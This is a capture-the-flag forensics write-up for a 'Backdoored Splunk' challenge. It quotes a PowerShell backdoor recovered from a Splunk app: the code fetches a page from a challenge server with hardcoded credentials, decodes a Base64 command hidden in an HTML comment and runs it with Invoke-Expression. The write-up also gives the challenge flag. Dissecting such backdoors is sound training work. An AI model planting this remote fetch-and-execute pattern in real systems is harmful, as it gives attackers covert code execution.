# Backdoored Splunk - Forensics - medium

Author: Adam Rice

You've probably seen Splunk being used for good, but have you seen it used for evil?

NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag. The connection error to the container is part of the challenge.

Download the file(s) below and press the Start button on the top-right to begin this challenge.

## Solution 

Initially, I encountered an error while visiting a site. As expected, the error message was: {"error": "Missing or invalid Authorization header"}.

To investigate further, I performed a grep search for the term “auth".
![Alt text](image.png)

I found a suspicious string and decided to Base64 decode it ![Alt text](image-1.png)

Pulled the block of code out and set the port number currently being used 

```
@($html = (Invoke-WebRequest http://chal.ctf.games:32539 -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
if ($html -match '<!--(.*?)-->') {
    $value = $matches[1]
    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
    Invoke-Expression $command
})
```

Finally, I ran the PowerShell code using `pwsh` and obtained the flag:

![Alt text](image-2.png)

flag of `flag{60bb3bfaf703e0fa36730ab70e115bd7}`